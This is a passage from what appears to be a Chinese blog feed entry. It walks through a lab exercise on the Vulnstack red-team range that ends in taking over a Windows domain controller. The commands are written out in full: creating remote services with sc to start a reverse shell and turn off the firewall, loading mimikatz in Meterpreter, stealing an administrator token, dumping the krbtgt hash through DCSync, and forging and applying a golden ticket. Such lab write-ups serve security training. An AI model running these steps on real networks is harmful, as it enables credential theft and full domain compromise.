update.exe</span><br></pre></td></tr></table></figure><p>上传到域成员douser，查看当前目录<code>pwd</code>，<code>upload update.exe</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck445.png" alt="attck445.png"></p><p>创建反弹shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create Shell binpath= &quot;C:\update.exe&quot;</span><br></pre></td></tr></table></figure><p>设置监听，先不执行</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck444.png" alt="attck444.png"></p><p>执行关闭防火墙的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start ProtectFirewall</span><br></pre></td></tr></table></figure><p>虽然提示失败了，但是防火墙确实关闭了</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck441.png" alt="attck441.png"></p><p>执行反弹shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start Shell</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck446.png" alt="attck446.png"></p><p>开启监听，shell弹回来，拿到域控的shell</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck447.png" alt="attck447.png"></p><p>接下来，我们可以抓key，构造黄金令牌</p><p><code>load kiwi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure><p><code>help</code>可以帮助我们查看<code>command</code>文档</p><p><code>dcsync_ntlm</code> 来还原<code>krbtgt</code>的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[!] Running as SYSTEM, function will not work.</span><br></pre></td></tr></table></figure><p>出现这种情况，我们需要伪造administrator，然后再执行<code>dcsync_ntlm krbtgt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token 1952</span><br><span class="line">Stolen token with username: DEMO\administrator</span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 7c4ed692473d4b4344c3ba01c5e6cb63</span><br><span class="line">[+] LM Hash   : 4d81a5d6b591f0710e75884e5ef9cba2</span><br><span class="line">[+] SID       : S-1-5-21-979886063-1111900045-1414766810-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure><p><code>golden_ticket_create</code>构造黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d demo.com -u Administrator -s S-1-5-21-979886063-1111900045-1414766810 -k 7c4ed692473d4b4344c3ba01c5e6cb63 -t /home/kali/kali.tck</span><br><span class="line">[+] Golden Kerberos ticket written to /home/kali/kali.tck</span><br><span class="line"></span><br><span class="line">参数介绍</span><br><span class="line">-t /home/kali/kali.tck</span><br><span class="line">-d  域名</span><br><span class="line">-u  要伪造的用户</span><br><span class="line">-s  域SID</span><br><span class="line">-k  krbtge的ntlm</span><br><span class="line">-t  保存的本地路径</span><br></pre></td></tr></table></figure><p>导入黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eter &gt; kerberos_ticket_use /home/kali/kali.tck</span><br><span class="line">[*] Using Kerberos ticket stored in /home/kali/kali.tck, 1820 bytes ...</span><br><span class="line">[+] Kerberos ticket applied successfully.</span><br></pre></td></tr></table></figure><p>查看域控的c盘根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"> Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.</span><br><span class="line"> Volume Serial Number is 702B-0D1B</span><br><span class="line"></span><br><span class="line"> Directory of \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020/01/24  13:30    &lt;DIR&gt;          Program Files</span><br><span class="line">2020/01/24  13:30    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020/05/16  11:39            48,640 update.exe</span><br><span class="line">2019/12/31  11:01    &lt;DIR&gt;          Users</span><br><span class="line">2020/01/24  13:33    &lt;DIR&gt;          Windows</span><br><span class="line">               1 File(s)         48,640 bytes</span><br><span class="line">               5 Dir(s)  12,438,585,344 bytes free</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;amp;CK实战系列——红队评估（四）靶场环境，下载地址：&lt;</summary>
      
    
    
    
    <category term="实战" scheme="http://lvpsectime.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="实战" scheme="http://lvpsectime.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
</feed>
